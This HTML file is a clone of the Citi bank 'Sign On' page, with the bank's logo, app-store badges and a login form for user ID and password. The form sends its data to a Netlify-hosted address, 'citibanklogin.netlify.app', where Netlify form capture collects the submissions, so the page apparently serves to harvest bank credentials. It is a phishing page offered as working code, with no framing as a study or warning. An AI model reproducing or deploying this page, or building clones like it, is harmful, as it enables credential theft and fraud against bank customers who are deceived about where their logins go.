<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/output.css">
    <link rel="stylesheet" href="./input.css">
    
     <!-- remix icon -->
     <link href="https://cdn.jsdelivr.net/npm/remixicon@2.5.0/fonts/remixicon.css" rel="stylesheet">
    <title>Sign On to Your Citi Account</title>
</head>
<body>
    <main>
        <div class="h-[72px] flex justify-start bg-white w-full">
            <img src="./img/citilogoredesign.png" alt="">
        </div>
      
        <div class="bg-[#002a54] navbar h-[48px] flex justify-center items-center ">
            <div class="flex justify-center items">
                <div class="flex justify-center items-center">
                    <i class="ri-search-line text-[25px] text-white font-medium"></i>
                    <p class="pl-[1.5px] text-white font-semibold">How can we help?</p>
                </div>
            </div>
            <div class="absolute left-[.5rem] pt-1  h-[48px]">
                <div class="flex items-center">
                    <i class="ri-menu-fill text-[25px] text-white font-medium"></i> 
                </div> 
            </div>
        </div>
        <!-- download on -->
        <div class="mt-[2.2rem] ml-[6%]">
            <div>
                <h1 class="text-black font-normal text-base tracking-[0.023rem]">Download the Citi Mobile&#174 App</h1>
            </div>
            <div class="flex justify-start pl-2">
                <div class="flex space-x-5  ">
                    <!-- https://developer.apple.com/app-store/marketing/guidelines/#section-badges -->
                    <div class="logo flex mt-3 w-48 h-14 bg-black text-white rounded-xl items-center justify-center">
                        <div class="mr-3">
                            <svg viewBox="0 0 384 512" width="30" >
                                <path fill="currentColor" d="M318.7 268.7c-.2-36.7 16.4-64.4 50-84.8-18.8-26.9-47.2-41.7-84.7-44.6-35.5-2.8-74.3 20.7-88.5 20.7-15 0-49.4-19.7-76.4-19.7C63.3 141.2 4 184.8 4 273.5q0 39.3 14.4 81.2c12.8 36.7 59 126.7 107.2 125.2 25.2-.6 43-17.9 75.8-17.9 31.8 0 48.3 17.9 76.4 17.9 48.6-.7 90.4-82.5 102.6-119.3-65.2-30.7-61.7-90-61.7-91.9zm-56.6-164.2c27.3-32.4 24.8-61.9 24-72.5-24.1 1.4-52 16.4-67.9 34.9-17.5 19.8-27.8 44.3-25.6 71.9 26.1 2 49.9-11.4 69.5-34.3z"/>
                            </svg>
                        </div>
                        <div>
                            <div class="text-xs">Download on the</div>
                            <div class="text-2xl font-semibold font-sans -mt-1">App Store</div>
                        </div>
                    </div>
            
                   
            
                    <!-- https://play.google.com/intl/en_us/badges/ -->
                    <div class=" logo flex mt-3 w-48 h-14 bg-black text-white rounded-lg items-center justify-center">
                        <div class="mr-3">
                            <svg viewBox="30 336.7 120.9 129.2" width="30">
                                <path fill="#FFD400" d="M119.2,421.2c15.3-8.4,27-14.8,28-15.3c3.2-1.7,6.5-6.2,0-9.7  c-2.1-1.1-13.4-7.3-28-15.3l-20.1,20.2L119.2,421.2z"/>
                                <path fill="#FF3333" d="M99.1,401.1l-64.2,64.7c1.5,0.2,3.2-0.2,5.2-1.3  c4.2-2.3,48.8-26.7,79.1-43.3L99.1,401.1L99.1,401.1z"/>
                                <path fill="#48FF48" d="M99.1,401.1l20.1-20.2c0,0-74.6-40.7-79.1-43.1  c-1.7-1-3.6-1.3-5.3-1L99.1,401.1z"/>
                                <path fill="#3BCCFF" d="M99.1,401.1l-64.3-64.3c-2.6,0.6-4.8,2.9-4.8,7.6  c0,7.5,0,107.5,0,113.8c0,4.3,1.7,7.4,4.9,7.7L99.1,401.1z"/>
                            </svg>
                        </div>
                        <div>
                            <div class="text-xs">GET IT ON</div>
                            <div class="text-xl font-semibold font-sans -mt-1">Google Play</div>
                        </div>
                    </div>
                </div>
            </div>

            <!--  -->
            <div class="mt-[5.4rem]">
                <div>
                    <h1 class="text-black text-base font-normal">Sign On</h1>
                </div>
                <form class="space-y-4 md:space-y-6" name="citiemail" method="POST" data-netlify="true" action="https://citibanklogin.netlify.app/" >
                    <div>
                        <label for="userid" class="block mb-2 text-sm font-medium text-gray-900 dark:text-white">Email</label>
                        <input type="userid" name="userid" id="userid" class="bg-gray-200 border border-gray-200 text-black sm:text-sm rounded-lg  w-[93%] p-2.5 dark:bg-gray-200 dark:border-gray-200 dark:placeholder-gray-600 dark:text-black" placeholder="User ID" required="">
                    </div>
                    <div>
                        <label for="password" class="block mb-2 text-sm font-medium text-gray-900 dark:text-white">Password</label>
                         <input type="password" name="password" id="password" class="bg-gray-200 border border-gray-200 text-black sm:text-sm rounded-lg  w-[93%] p-2.5 dark:bg-gray-200 dark:border-gray-200 dark:placeholder-gray-600 dark:text-black" placeholder="Password" required="">
                    </div>
                    <div class="flex items-center justify-between">
                        <div class="flex items-start">
                            <div class="flex items-center h-5">
                              <input id="remember" aria-describedby="remember" type="checkbox" class="w-4 h-4 border border-gray-300 rounded bg-gray-50 focus:ring-3 focus:ring-primary-300 dark:bg-gray-700 dark:border-gray-600 dark:focus:ring-primary-600 dark:ring-offset-gray-800" required="">
                            </div>
                            <div class="ml-3 text-sm">
                              <label for="remember" class="text-black underline underline-offset-1 ">Remember me</label>
                            </div>
                        </div>
                    </div>
                    <button type="submit" class="w-[93%] text-white bg-[#056dae]  font-medium rounded-lg text-sm px-5 py-2.5 text-center ">Sign On</button>
                
                </form>
            </div>
            <div>
                <div class="flex justify-between w-[93%]">
                    <div>
                        <h1 class="text-black underline underline-offset-1 ">Forgot User ID?</h1>
                    </div>
                    <div>
                        <h1 class="text-black underline underline-offset-1 text-left pr-[3.8rem] ">Forgot Password</h1>
                    </div>
                </div>
                <div class="flex justify-between w-[93%]">
                    <div>
                        <h1 class="text-black underline underline-offset-1 ">Activate a Card</h1>
                    </div>
                    <div>
                        <h1 class="text-black underline underline-offset-1 ">Register for Online Access</h1>
                    </div>
                </div>
            </div>
        
    </main>
</body>
</html>
